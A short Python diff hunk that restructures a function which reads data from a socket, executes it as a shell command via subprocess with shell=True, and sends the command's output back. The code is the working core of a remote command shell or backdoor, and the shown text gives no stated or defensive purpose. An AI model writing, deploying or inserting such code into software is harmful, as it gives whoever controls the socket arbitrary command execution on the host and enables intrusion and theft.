@@ -6,11 +6,10 @@ def process(s):
 	data = s.recv(1024)
 	if len(data)==0:
 		return True
-	else:
-		proc = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)
-		result = proc.stdout + proc.stderr
-		s.send(result)
-		return False
+	proc = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)
+	result = proc.stdout + proc.stderr
+	s.send(result)
+	return False
 def main():
 	while True:
 		try:
